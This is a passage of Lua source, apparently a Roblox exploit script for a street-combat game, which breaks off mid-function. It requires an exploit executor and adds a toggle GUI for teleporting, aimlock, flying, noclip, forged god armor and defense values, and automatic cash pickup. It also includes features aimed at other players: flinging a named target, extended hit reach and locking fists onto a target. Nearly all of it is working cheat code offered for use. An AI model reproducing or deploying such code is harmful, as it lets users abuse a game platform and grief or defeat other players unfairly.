------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
player = game.Players.LocalPlayer
mouse = player:GetMouse()
MainEvent = game:GetService('ReplicatedStorage').MainEvent
IsMod = false

MaxDistance = 15

COOLDOWN = true
RIDING = false

Aimlocked = nil

NamePos = CFrame.new(0,0,0)

green = Color3.new(0,255,0)
red = Color3.new(255,0,0)

buyingarmor = false
UIS.InputBegan:Connect(function(key,b) 
    if key.KeyCode == Enum.KeyCode.V and not b then
        if SwagmodeFrame.Visible == true then
            SwagmodeFrame.Visible = false
        else
            SwagmodeFrame.Visible = true
        end
    end
    if key.KeyCode == Enum.KeyCode.Q and not b then    
        if QToTpColor.BackgroundColor3 == green then
        	if mouse.Target then 
        		local part = mouse.Target
                local partSize = part.Size
                local halfSize = partSize.Y/2
                player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.X,part.Position.Y + halfSize + 3,mouse.Hit.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                    player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                    player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.LeftAlt and not b then
        if buyingarmor == false and AltArmorColor.BackgroundColor3 == green then
            local ItemCost = 1000
            buyingarmor = true
            local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector
            local Location = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector.Parent.Head.Position
            OldCFrame = player.Character.HumanoidRootPart.CFrame
            local function buy()
                wait()
                player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                fireclickdetector(ClickDetector)
            end
            repeat buy() until player.Character.BodyEffects.Armor.Value == 100 or player.DataFolder.Currency.Value <= ItemCost or player.Character.BodyEffects.Armor:FindFirstChild('God')
            player.Character.HumanoidRootPart.CFrame = OldCFrame
            buyingarmor = false
        end
    end
    if key.KeyCode == Enum.KeyCode.F and not b then
        if HideBlockColor.BackgroundColor3 == green or AutoBlockColor.BackgroundColor3 == green then
            HoldingF = true
            player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG ON TOP'
            while HoldingF == true and HideBlockColor.BackgroundColor3 == green do
                wait()
                for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Name == 'Block' then
                        v:Stop()
                    end
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.Space and not b then
        coroutine.resume(coroutine.create(function()
            if Stamina.Text == 'Unstamina' then
                HoldingSpace = true
                while HoldingSpace == true do
                    wait()
                    player.Character:FindFirstChildWhichIsA('Humanoid').JumpPower = 50
                    player.Character:FindFirstChildWhichIsA('Humanoid').Jump = true
                end
            end
        end))
        if RIDING == true then
            COOLDOWN = false
            for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
                if v.Name == 'MyLauncher' then
                    v.Name = 'Launcher'
                end
            end
            repeat wait() until not game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
            COOLDOWN = true
        end
    end
    if key.KeyCode == Enum.KeyCode.E and not b then
        if Aimlock.Text == 'Unaimlock' then
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    Aimlocked = LowerTorso.Parent.Parent.Parent.Name
                else
                    Aimlocked = LowerTorso.Parent.Name
                end
                announce('Aimlocked to ' .. Aimlocked, RPGTarget, 3)
            else
                Aimlocked = nil
                announce('Unaimlocked', '', 2)
            end
        end
    end
end)

HoldingSpace = false
UIS.InputEnded:Connect(function(key,b)
    if key.KeyCode == Enum.KeyCode.F and not b then
        player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'Humanoid'
        HoldingF = false
    end
    if key.KeyCode == Enum.KeyCode.Space then
        HoldingSpace = false
    end
end)

player.CharacterAdded:Connect(function(character)
    repeat wait() until player.Character
    NamePos = player.Character.HumanoidRootPart.CFrame
    if SpawnPosition ~= nil then
        player.Character.HumanoidRootPart.CFrame = SpawnPosition
    end
end)


game.Workspace.Ignored.ChildAdded:Connect(function(child)
    if child.Name == 'Launcher' and player.Character:FindFirstChild('[RPG]') then
        child.Name = 'MyLauncher' 
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

View.MouseButton1Click:Connect(function()
    if View.Text == 'View' then
        View.Text = 'Unview'
        repeat view(TargetTextbox.Text) until View.Text == 'View'
        game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
    else
        View.Text = 'View'
    end
end)
GodBlock.MouseButton1Click:Connect(function()
    if player.Character.HumanoidRootPart.Size.X == 2 and player.Character.HumanoidRootPart.Size.Y == 2 then
        player.Character.BodyEffects.Defense:Destroy()
        Defense = Instance.new("IntValue", player.Character.BodyEffects)
        Defense.Name = "Defense"
        Defense.Value = 100
        announce('ez','successfully godblocked',10)
    else
        announce('Error','you need to be using UNBAN to use godblock',10)
    end
end)
GodArmor.MouseButton1Click:Connect(function()
    player.Character.BodyEffects.Armor:Destroy()
    Armor = Instance.new("IntValue", player.Character.BodyEffects)
    Armor.Name = 'Armor'
    Armor.Value = 100
    GodLabel = Instance.new('IntValue', Armor)
    GodLabel.Name = 'God'
end)
Headless.MouseButton1Click:Connect(function()
    player.Character.Head:BreakJoints()
    player.Character.Head.Position = Vector3.new(0,99999999999999,0)
end)
GoTo.MouseButton1Click:Connect(function()
    player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position)
end)
NoRecoil.MouseButton1Click:Connect(function()
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
        if v:IsA('Camera') then
            v:Destroy()
        end
    end
    local newcam = Instance.new('Camera',game.Workspace)
    newcam.Name = 'Camera'
    newcam.CameraType = 'Custom'
    newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
    newcam.HeadLocked = true
    newcam.HeadScale = 1
        	    
end)
if not syn and not KRNL_LOADED then
    Reach.Text = 'ToolReach'
end
Reach.MouseButton1Click:Connect(function()
    if Reach.Text == 'ToolReach' then
        if player.Character:FindFirstChildWhichIsA('Tool') then
            player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
        	player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
        else
            announce('Reach Error', 'you need to be holding a tool', 3)
        end
    else
        if Reach.Text == 'Reach' then
            Reach.Text = 'Unreach'
            while Reach.Text == 'Unreach' do
                wait()
                    local success, err = pcall(function()
                    if player.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        else
            Reach.Text = 'Reach'
        end
    end
end)
FreeFists.MouseButton1Click:Connect(function()
    for i,v in next, workspace:GetDescendants() do
        if v:IsA'Seat' then
            v:Destroy()
        end
    end
    local FistControl = false
    pcall(function()
        player.Character.LeftHand.LeftWrist:Destroy();
        player.Character.RightHand.RightWrist:Destroy();
    end);
    local loopFunction = function()
        player.Character.LeftHand.CFrame  = CFrame.new(mouse.Hit.p);
        player.Character.RightHand.CFrame = CFrame.new(mouse.Hit.p);
    end;        
    local Loop
    local Start = function()
        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
    end;         
    local Pause = function()
        Loop:Disconnect()
    end;
    UIS.InputBegan:Connect(function(a, b)
        if a.KeyCode == Enum.KeyCode.T and not b then
            if FistControl == false then
                FistControl = true;
                Start();
            elseif FistControl == true then
                FistControl = false;
                Pause();
                player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
                player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
            end;
        end;
    end)
end)
Target.MouseButton1Click:Connect(function()
    if Target.Text == 'Target' then
        Target.Text = 'Untarget'
        pcall(function()
            player.Character.LeftHand.LeftWrist:Destroy();
            player.Character.RightHand.RightWrist:Destroy();
        end);
        local loopFunction = function()
            if game.Players:FindFirstChild(TargetTextbox.Text).Character then
                player.Character.LeftHand.CFrame  = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
                player.Character.RightHand.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position);
                if game.Players:FindFirstChild(TargetTextbox.Text).Character.BodyEffects['K.O'].Value == true then
                    Target.Text = 'Target'
                end
            else
                Target.Text = 'Target'
            end
        end;        
        local Loop
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;         
        local Pause = function()
            Loop:Disconnect()
            announce('Target', 'no longer targeting', 5)
            player.Character.LeftHand.CFrame  = player.Character.LeftLowerArm.CFrame
            player.Character.RightHand.CFrame = player.Character.RightLowerArm.CFrame
        end;
        Start()
        repeat wait() until Target.Text == 'Target'
        Pause()
    else
        Target.Text = 'Target'
    end
end)
local OldState = player.Character:FindFirstChildWhichIsA('Humanoid'):GetState()
NoClip.MouseButton1Click:Connect(function()
    local Character = player.Character
    local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')
    local Control = false
    local loopFunction = function()
        Humanoid:ChangeState(11)
    end;
    local Loop
    local Start = function()
        if Control == false then
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end
    end;
    local Ended = function()
        if Control == true then
            Humanoid:ChangeState(OldState)
        end
    end;
    Start()	
    local Pause = function()
        Loop:Disconnect()
    end;
    local Pause2 = function()
        Start();
        Loop2:Disconnect()
    end;
    UIS.InputBegan:Connect(function(a, b)
        if a.KeyCode == Enum.KeyCode.Z and not b then
            if Control == false then
            	Control = true;
            	Ended();
            	Pause();
            elseif Control == true then
            	Control = false;
            	Pause2();
            end;
        end;
    end);	
end)


FLYMODE = 'Default'
FLYSPEED = 20

FlySpeedPlus.MouseButton1Click:Connect(function()
    FLYSPEED = FLYSPEED + 3
    announce('FlySpeed changed', tostring(FLYSPEED), 3)
end)
FlySpeedMinus.MouseButton1Click:Connect(function()
    FLYSPEED = FLYSPEED - 3
    announce('Speed changed', tostring(FLYSPEED), 3)
end)
FlyMode.MouseButton1Click:Connect(function()
    if FLYMODE == 'Default' then
        FLYMODE = 'IY'
        announce('Flymode changed', 'IY Mode {changes on death}', 3)
    elseif FLYMODE == 'IY' then
        FLYMODE = 'SuperHero'
        announce('Flymode changed', 'HeroFly {changes on death}', 3)
    else
        FLYMODE = 'Default'
        announce('Flymode changed', 'Default {changes on death}', 3)
    end
end)

Fly.MouseButton1Click:Connect(function()
    if FLYMODE == 'Default' then
        local plr = game.Players.LocalPlayer
        local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
        local mouse = plr:GetMouse()
        localplayer = plr
        if workspace:FindFirstChild("Core") then
            workspace.Core:Destroy()
        end
        local Core = Instance.new("Part")
        Core.Name = "Core"
        Core.Size = Vector3.new(0.05, 0.05, 0.05)
        spawn(function()
            Core.Parent = workspace
            local Weld = Instance.new("Weld", Core)
            Weld.Part0 = Core
            Weld.Part1 = localplayer.Character.LowerTorso
            Weld.C0 = CFrame.new(0, 0, 0)
        end)
        workspace:WaitForChild("Core")
        local torso = workspace.Core
        flying = true
        local speed=FLYSPEED
        local keys={a=false,d=false,w=false,s=false}
        local e1
        local e2
        local function start()
            local pos = Instance.new("BodyPosition",torso)
            local gyro = Instance.new("BodyGyro",torso)
            pos.Name="EPIXPOS"
            pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
            pos.position = torso.Position
            gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
            gyro.cframe = torso.CFrame
            repeat
                wait()
                Humanoid.PlatformStand=true
                local new=gyro.cframe - gyro.cframe.p + pos.position
                if not keys.w and not keys.s and not keys.a and not keys.d then
                    speed=FLYSPEED
                end
                if keys.w then
                    new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                    speed=speed
                end
                if keys.s then
                    new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                    speed=speed
                    end
                if keys.d then
                    new = new * CFrame.new(speed,0,0)
                    speed=speed
                end
                if keys.a then
                    new = new * CFrame.new(-speed,0,0)
                    speed=speed
                end
                if speed>FLYSPEED then
                    speed=FLYSPEED
                end
                pos.position=new.p
                if keys.w then
                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
                elseif keys.s then
                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
                else
                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame
                end
                until flying == false
                if gyro then gyro:Destroy() end
                if pos then pos:Destroy() end
                flying=false
                    Humanoid.PlatformStand=false
                    speed=FLYSPEED
                end
                e1=mouse.KeyDown:connect(function(key)
                    if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
                    if key=="w" then
                        keys.w=true
                    elseif key=="s" then
                        keys.s=true
                    elseif key=="a" then
                        keys.a=true
                    elseif key=="d" then
                        keys.d=true
                    elseif key=="x" then
                        if flying==true then
                            flying=false
                        else
                            flying=true
                            start()
                        end
                    end
                end)
            e2=mouse.KeyUp:connect(function(key)
                if key=="w" then
                    keys.w=false
                elseif key=="s" then
                    keys.s=false
                elseif key=="a" then
                    keys.a=false
                elseif key=="d" then
                    keys.d=false
                end
            end)
        start()
    elseif FLYMODE == 'IY' then
        repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        repeat wait() until mouse
        local plr = game.Players.LocalPlayer
        local torso = plr.Character.Head
        local flying = false
        local deb = true
        local ctrl = {f = 0, b = 0, l = 0, r = 0}
        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
        local maxspeed = 5000
        local speed = 5000
        function Fly()
            local bg = Instance.new("BodyGyro", torso)
            bg.P = 9e4
            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            bg.cframe = torso.CFrame
            local bv = Instance.new("BodyVelocity", torso)
            bv.velocity = Vector3.new(0,0.1,0)
            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            repeat wait()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
            if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
                speed = speed+.0+(speed/maxspeed)
                if speed > maxspeed then
                    speed = maxspeed
                end
            elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
                speed = speed-5
                if speed > 5 then
                    speed = -2
                end
            end
            if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
            elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
            else
                bv.velocity = Vector3.new(0,0.1,0)
            end
            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
            until not flying
            ctrl = {f = 0, b = 0, l = 0, r = 0}
            lastctrl = {f = 0, b = 0, l = 0, r = 0}
            speed = 5
            bg:Destroy()
            bv:Destroy()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
            end
            mouse.KeyDown:connect(function(key)
            if key:lower() == "x" then
                if flying then flying = false
                else
                    flying = true
                    Fly()
                end
                elseif key:lower() == "w" then
                ctrl.f = FLYSPEED
                elseif key:lower() == "s" then
                ctrl.b = -FLYSPEED
                elseif key:lower() == "a" then
                ctrl.l = -FLYSPEED
                elseif key:lower() == "d" then
                ctrl.r = FLYSPEED
                end
            end)
            mouse.KeyUp:connect(function(key)
                if key:lower() == "w" then
                ctrl.f = 0
                elseif key:lower() == "s" then
                ctrl.b = 0
                elseif key:lower() == "a" then
                    ctrl.l = 0
                elseif key:lower() == "d" then
                    ctrl.r = 0
                end
            end)
        Fly()
    elseif FLYMODE == 'SuperHero' then
        local player = game.Players.LocalPlayer
        local Flyanimation = Instance.new('Animation', game.Workspace)
        Flyanimation.AnimationId = 'rbxassetid://3541044388'
        local Idleanimation = Instance.new('Animation', game.Workspace)
        Idleanimation.AnimationId = 'rbxassetid://3541114300'
        local HeroIdle = player.Character.Humanoid:LoadAnimation(Idleanimation)
        local HeroFly = player.Character.Humanoid:LoadAnimation(Flyanimation)
        Idleing2 = false
            local function flyanim()
                    --HeroIdle:Stop()
                    local FlyingA = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541044388' then
                            FlyingA = true
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788289281' then
                            v:Stop()
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788292075' then
                            v:Stop()
                        end
                    end
                    if FlyingA == false and Idleing2 == false then
                        HeroFly:Play()
                    end
            end
        
        local SPEED = FLYSPEED
        repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        repeat wait() until mouse
        local plr = game.Players.LocalPlayer
        local torso = plr.Character.Head
        flying = false
        local deb = true
        local ctrl = {f = 0, b = 0, l = 0, r = 0}
        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
        maxspeed = 5000
        speed = 5001
        function Fly()
            local bg = Instance.new("BodyGyro", torso)
            bg.P = 9e4
            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            bg.cframe = torso.CFrame
            local bv = Instance.new("BodyVelocity", torso)
            bv.velocity = Vector3.new(0,0.1,0)
            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            repeat wait()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
            if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
                speed = speed+.0+(speed/maxspeed)
                local foundidle = false
                flyanim()
            if speed > maxspeed then
        
                speed = maxspeed
        
            end
            elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
                speed = speed-5
                
            if speed > 5 then
                speed = -2
            end
            end
            if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
            elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
              
            else
                bv.velocity = Vector3.new(0,0.1,0)
        
        
            end
            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
            until not flying
            ctrl = {f = 0, b = 0, l = 0, r = 0}
            lastctrl = {f = 0, b = 0, l = 0, r = 0}
            speed = 5
            bg:Destroy()
            bv:Destroy()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
        end
        mouse.KeyDown:connect(function(key)
            if key:lower() == "x" then
                if flying then
                    flying = false
                    HeroFly:Stop()
                    HeroIdle:Stop()
            else
                flying = true
                Fly()
            end
        
            elseif key:lower() == "w" then
                ctrl.f = FLYSPEED
            elseif key:lower() == "s" then
                ctrl.b = -FLYSPEED
            elseif key:lower() == "a" then
                ctrl.l = -FLYSPEED
            elseif key:lower() == "d" then
                ctrl.r = FLYSPEED
            end
        end)
        mouse.KeyUp:connect(function(key)
            if key:lower() == "w" then
                ctrl.f = 0
            elseif key:lower() == "s" then
                ctrl.b = 0
            elseif key:lower() == "a" then
                ctrl.l = 0
            elseif key:lower() == "d" then
                ctrl.r = 0
            end
            if ctrl.r == 0 and ctrl.l == 0 and ctrl.b == 0 and ctrl.f == 0 then
                local Loop
                local loopFunction = function()
                    Idleing2 = true
                    HeroFly:Stop()
                    wait()
                    Idleing = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541114300' then
                            Idleing = true
                        end
                    end
                    if Idleing == false and flying == true then
                        HeroIdle:Play()
                    end
        
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Idleing2 = false
                end;
                Start()	
                repeat wait() until ctrl.r ~= 0 or ctrl.l ~= 0 or ctrl.b ~= 0 or ctrl.f ~= 0 or flying == false
                Pause()
            end
            end)
        Fly()
        player.CharacterAdded:Connect(function()
            repeat wait() until player.Character
            wait(1)
            Fly()
        end)
    end
end)

Fling.MouseButton1Click:Connect(function()
    if Fling.Text == 'Fling' then
        Fling.Text = 'Unfling'
        local Loop
        local OldFlingPos = player.Character.HumanoidRootPart.Position
        local loopFunction = function()
            local success,err = pcall(function()
                local FlingEnemy = Players:FindFirstChild(TargetTextbox.Text).Character
                if FlingEnemy and player.Character then
                    FlingTorso = FlingEnemy.UpperTorso
                    local dis = 3.85
                    local increase = 6
                    if FlingEnemy.Humanoid.MoveDirection.X < 0 then
                        xchange = -increase
                    elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
                        xchange = increase
                    else
                        xchange = 0
                    end
                    if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
                        zchange = -increase
                    elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
                        zchange = increase
                    else
                        zchange = 0
                    end          
                    if player.Character then
                        player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X + 350),math.rad(player.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(player.Character.HumanoidRootPart.Orientation.Z + 240))
                        player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
                    end
                end
            end)
            if err then
                print('fling error : ' .. err)
            end
        end;
        local Start = function()    
            OldFlingPos = player.Character.HumanoidRootPart.Position
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
            local vectorZero = Vector3.new(0, 0, 0)
            player.Character.PrimaryPart.Velocity = vectorZero
            player.Character.PrimaryPart.RotVelocity = vectorZero
            player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
        end;
        Start()	
        repeat wait() until Fling.Text == 'Fling'
        Pause()
    else
        Fling.Text = 'Fling'
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------


QToTpColor.BackgroundColor3 = red
QToTp.MouseButton1Click:Connect(function()
    if QToTpColor.BackgroundColor3 == red then
        QToTpColor.BackgroundColor3 = green
    else
        QToTpColor.BackgroundColor3 = red
    end
end)

AntiSlowColor.BackgroundColor3 = red
AntiSlow.MouseButton1Click:Connect(function()
    if AntiSlowColor.BackgroundColor3 == red then
        AntiSlowColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            local DeletePart = player.Character.BodyEffects.Movement:FindFirstChild('NoJumping') or player.Character.BodyEffects.Movement:FindFirstChild('ReduceWalk') or player.Character.BodyEffects.Movement:FindFirstChild('NoWalkSpeed')
            if DeletePart then DeletePart:Destroy() end
            if player.Character.BodyEffects.Reload.Value == true then player.Character.BodyEffects.Reload.Value = false end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiSlowColor.BackgroundColor3 == red
        Pause()
    else
        AntiSlowColor.BackgroundColor3 = red
    end
end)

CashAuraColor.BackgroundColor3 = red
CashAura.MouseButton1Click:Connect(function()
    if CashAuraColor.BackgroundColor3 == red then
        CashAuraColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
                if v:IsA('Part') then
                    if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                        fireclickdetector(v:FindFirstChild('ClickDetector'))
                    end
                end
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until CashAuraColor.BackgroundColor3 == red
        Pause()
    else
        CashAuraColor.BackgroundColor3 = red
    end
end)

HideBlockColor.BackgroundColor3 = red
HideBlock.MouseButton1Click:Connect(function()
    if HideBlockColor.BackgroundColor3 == red then
        HideBlockColor.BackgroundColor3 = green
    else
        HideBlockColor.BackgroundColor3 = red
    end
end)

AntiStompColor.BackgroundColor3 = red
AntiStomp.MouseButton1Click:Connect(function()
    if AntiStompColor.BackgroundColor3 == red then
        AntiStompColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            if player.Character.BodyEffects['K.O'].Value == true then player.Character:Destroy() end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiStompColor.BackgroundColor3 == red
        Pause()
    else
        AntiStompColor.BackgroundColor3 = red
    end
end)

AutoBlockColor.BackgroundColor3 = red
AutoBlock.MouseButton1Click:Connect(function()
    if AutoBlockColor.BackgroundColor3 == red then
        AutoBlockColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            local forbidden = {'[RPG]','[SMG]','[TacticalShotgun]','[AK47]','[AUG]','[Glock]', '[Shotgun]','[Flamethrower]','[Silencer]','[AR]','[Revolver]','[SilencerAR]','[LMG]','[P90]','[DrumGun]','[Double-Barrel SG]','[Hamburger]','[Chicken]','[Pizza]','[Cranberry]','[Donut]','[Taco]','[Starblox Latte]','[BrownBag]','[Weights]','[HeavyWeights]'}
            local Found = false
            for _,v in pairs(game.Workspace.Players:GetChildren()) do
                if (v.UpperTorso.Position - player.Character.HumanoidRootPart.Position).Magnitude <= MaxDistance then
                    if v.BodyEffects.Attacking.Value == true and not table.find(forbidden, v:FindFirstChildWhichIsA('Tool').Name ) and v.Name ~= player.Name then
